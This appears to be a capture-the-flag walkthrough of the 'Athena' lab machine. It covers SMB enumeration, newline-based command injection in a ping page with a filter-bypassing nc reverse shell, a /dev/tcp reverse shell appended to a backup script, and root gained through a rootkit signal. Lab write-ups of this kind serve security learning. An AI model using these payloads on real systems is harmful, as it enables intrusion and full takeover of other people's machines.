# THM-Athena

## Nmap result

```
 # nmap -sC -sV -A -T4 -p- --open 10.10.237.57 -vvv

PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3bc8f813e0cb42600df64cdc55d83bed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqrhWpCkIWorEVg4w8mfia/rsblIvsmSU9y9mEBby77pooZXLBYMvMC0aiaJvWIgPVOXrHTh9IstAF6s9Tpjx+iV+Me2XdvUyGPmzAlbEJRO4gnNYieBya/0TyMmw0QT/PO8gu/behXQ9R6yCjiw9vmsV+99SiCeuIHssGoLtvTwXE2i8kxqr5S0atmBiDkIqlp+qD1WZzc8YP5OU0CIN5F9ytZOVqO9oiGRgI6CP4TwNQwBLU2zRBmUmtbV9FRQyObrB1zCYcEZcKNPzasXHgRkfYMK9OMmUBhi/Hveei3BNtdaWARN9x30O488BmdET3iaTt5gcIgHfAO+5WzUPBswerbcOHp2798DXkuVpsklS9Zi9dvpxoyZFsmu1RoklPWea+rxq09KRjciXNvy+jV8zBGCGKwwi62nL9mRyA5ZakJKrpWCPffnEMK37SHL0WqWMRZI4Bbj2cOpJztJ+5Ttbj5wixecnvZu8hkknfMSVwPM8RqwQuXtes8AqF6gs=
|   256 1f42e1c3a5172a38693e9b736dcd5633 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPBg1Oa6gqrvB/IQQ1EmM1p5o443v5y1zDwXMLkd9oUfYsraZqddzwe2CoYZD3/oTs/YjF84bDqeA+ILx7x5zdQ=
|   256 7a67598d37c56729e853e81edfb0c71e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaJ6imGGkCETvb1JN5TUcfj+AWLbVei52kD/nuGSHGF
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: 02:82:BB:C4:82:11 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/16%OT=22%CT=1%CU=31420%PV=Y%DS=1%DC=D%G=Y%M=0282BB%T
OS:M=6505AACB%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Uptime guess: 10.064 days (since Wed Sep  6 11:44:49 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40828/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 28895/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57906/udp): CLEAN (Failed to receive data)
|   Check 4 (port 23959/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   ROUTERPANEL<00>      Flags: <unique><active>
|   ROUTERPANEL<03>      Flags: <unique><active>
|   ROUTERPANEL<20>      Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   SAMBA<00>            Flags: <group><active>
|   SAMBA<1d>            Flags: <unique><active>
|   SAMBA<1e>            Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2023-09-16T13:16:59
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

```
## Enum4linux result

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep 16 13:35:53 2023

 =========================================( Target Information )=========================================                                                                         
                                                                                         
Target ........... 10.10.237.57                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.237.57 )============================                                                                         
                                                                                         
                                                                                         
[+] Got domain/workgroup name: SAMBA                                                     
                                                                                         
                                                                                         
 ================================( Nbtstat Information for 10.10.237.57 )================================                                                                         
                                                                                         
Looking up status of 10.10.237.57                                                        
        ROUTERPANEL     <00> -         B <ACTIVE>  Workstation Service
        ROUTERPANEL     <03> -         B <ACTIVE>  Messenger Service
        ROUTERPANEL     <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        SAMBA           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        SAMBA           <1d> -         B <ACTIVE>  Master Browser
        SAMBA           <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.237.57 )===================================                                                                          
                                                                                         
                                                                                         
[+] Server 10.10.237.57 allows sessions using username '', password ''                   
                                                                                         
                                                                                         
 ================================( Getting domain SID for 10.10.237.57 )================================                                                                          
                                                                                         
Cannot connect to server.  Error was NT_STATUS_NOT_FOUND                                 

[+] Can't determine if host is part of domain or part of a workgroup                     
                                                                                         
                                                                                         
 ===================================( OS information on 10.10.237.57 )===================================                                                                         
                                                                                         
                                                                                         
[E] Can't get OS info with smbclient                                                     
                                                                                         
                                                                                         
[+] Got OS info for 10.10.237.57 from srvinfo:                                           
Cannot connect to server.  Error was NT_STATUS_UNSUCCESSFUL                              


 =======================================( Users on 10.10.237.57 )=======================================                                                                          
                                                                                         
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                  
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.237.57 )=================================                                                                          
                                                                                         
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                    

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.237.57                                             
                                                                                         
//10.10.237.57/public   Mapping: OK Listing: OK Writing: N/A                             

[E] Can't understand response:                                                           
                                                                                         
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                               
//10.10.237.57/IPC$     Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.237.57 )============================                                                                         
                                                                                         
                                                                                         

[+] Attaching to 10.10.237.57 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] ROUTERPANEL
        [+] Builtin

[+] Password Info for Domain: ROUTERPANEL

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                     
                                                                                         
                                                                                         
                                                                                         

 =======================================( Groups on 10.10.237.57 )=======================================                                                                         
                                                                                         
                                                                                         
[+] Getting builtin groups:                                                              
                                                                                         
                                                                                         
[+]  Getting builtin group memberships:                                                  
                                                                                         
                                                                                         
[+]  Getting local groups:                                                               
                                                                                         
                                                                                         
[+]  Getting local group memberships:                                                    
                                                                                         
                                                                                         
[+]  Getting domain groups:                                                              
                                                                                         
                                                                                         
[+]  Getting domain group memberships:                                                   
                                                                                         
                                                                                         
 ==================( Users on 10.10.237.57 via RID cycling (RIDS: 500-550,1000-1050) )==================                                                                          
                                                                                         
                                                                                         
 ===============================( Getting printer info for 10.10.237.57 )===============================                                                                          
                                                                                         
Cannot connect to server.  Error was NT_STATUS_UNSUCCESSFUL
```

## crackmapexec result

```
crackmapexec smb 10.10.237.57 -u '' -p '' --shares
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.237.57    445    ROUTERPANEL      [*] Windows 6.1 Build 0 (name:ROUTERPANEL) (domain:ROUTERPANEL) (signing:False) (SMBv1:False)
SMB         10.10.237.57    445    ROUTERPANEL      [+] ROUTERPANEL\: 
SMB         10.10.237.57    445    ROUTERPANEL      [+] Enumerated shares
SMB         10.10.237.57    445    ROUTERPANEL      Share           Permissions     Remark
SMB         10.10.237.57    445    ROUTERPANEL      -----           -----------     ------
SMB         10.10.237.57    445    ROUTERPANEL      public          READ            
SMB         10.10.237.57    445    ROUTERPANEL      IPC$                            IPC Service (Samba 4.15.13-Ubuntu)
```

## smbclient result

```
smbclient --no-pass //10.10.237.57/public
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Apr 17 00:54:43 2023
  ..                                  D        0  Mon Apr 17 00:54:05 2023
  msg_for_administrator.txt           N      253  Sun Apr 16 18:59:44 2023

                19947120 blocks of size 1024. 9690660 blocks available
smb: \> get msg_for_administrator.txt 
getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \> exit

```

## Txt result

```
cat msg_for_administrator.txt                     

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

## Burpsuite tool

/myrouterpanel

![image](https://github.com/L43371/THM-Athena/assets/129752764/ff804bae-ac94-4af5-80cc-f9f9186d981d)

Intercepting the Send button and sending it to Repeater

```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.237.57
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://10.10.237.57
Connection: close
Referer: http://10.10.237.57/myrouterpanel/
Upgrade-Insecure-Requests: 1

ip=127.0.0.1&submit=
```

By adding **%0A'id'** to the ip=127.0.0.1 and sending it, will give us the id result

```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.237.57
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://10.10.237.57
Connection: close
Referer: http://10.10.237.57/myrouterpanel/
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%0A'id'&submit=
```

Result

```
HTTP/1.1 200 OK
Date: Sat, 16 Sep 2023 15:28:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 490
Connection: close
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3055ms
rtt min/avg/max/mdev = 0.019/0.031/0.037/0.007 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>

```

When trying to use the command bypass ";, |, and &" are blocked so we need to find a way to bypass this.

We then create a reverse shell using nc 

```
nc 10.6.48.114 9007 -e /bin/bash
```

We then use cyberchef to URL encode this

```
nc%2010%2E6%2E48%2E114%209007%20%2De%20%2Fbin%2Fbash
```
Trying to add this to Burp suite but it does not work, so the way that I found that works is to add ' to each hex.

```
ip=127.0.0.1%0A'nc'%20'10'%2E'6'%2E'48'%2E'114'%20'9007'%20''%2D'e'%20''%2F'bin'%2F'bash'&submit=
```

and before sending it, we need to open a listener to our machine.

```
nc -lvnp 9007

```

And when sending it we should get a shell

```
nc -lvnp 9007                                      
listening on [any] 9007 ...
connect to [10.6.48.114] from (UNKNOWN) [10.10.237.57] 40592
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then we need to spawn shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@routerpanel:/var/www/html/myrouterpanel$ 
```
Trying sudo -l does not work as it requires password.

We will try using another tool called **linpeas.sh**

## linpeas interesting found

```
/usr/share/backup/backup.sh

```
```
cat /usr/share/backup/backup.sh
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```
Now we will modify the file to have another reverse shell

```
echo 'bash -i >& /dev/tcp/10.6.48.114/9009 0>&1' >> /usr/share/backup/backup.sh

```
 Then we will open another listener to our machine and run the file, we should get a shell

```
/usr/share/backup/backup.sh
```

```
nc -lvnp 9008                                      
listening on [any] 9008 ...
connect to [10.6.48.114] from (UNKNOWN) [10.10.237.57] 44698
bash: cannot set terminal process group (39762): Inappropriate ioctl for device
bash: no job control in this shell
athena@routerpanel:/$ whoami
whoami
athena
athena@routerpanel:/$
```

Running **sudo -l***

```
athena@routerpanel:/$ sudo -l
sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

We can now get the **user.txt**

```
cat user.txt
857c4a4fbac638afb6c7ee45eb3e1a28
```

Now we will work on Privilege escalation

We will download the venom.ko and use Ghidra to analyze it.

![image](https://github.com/L43371/THM-Athena/assets/129752764/7fbf0619-9e84-46ec-ab0e-cf157b529688)

When me checked the **0x39** it is **57** now this is similar to Diamorphine rootkit (https://github.com/m0nad/Diamorphine)

Lastly we will just run the sudo command

```
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
```

and on the github page is there is a kill command that we can use to gain our root.

```
athena@routerpanel:~/.ssh$ kill -57 0
uid=0(root) gid=0(root) groups=0(root),1001(athena)
athena@routerpanel:/root$ cat root.txt
aecd4a3497cd2ec4bc71a2315030bd48
````
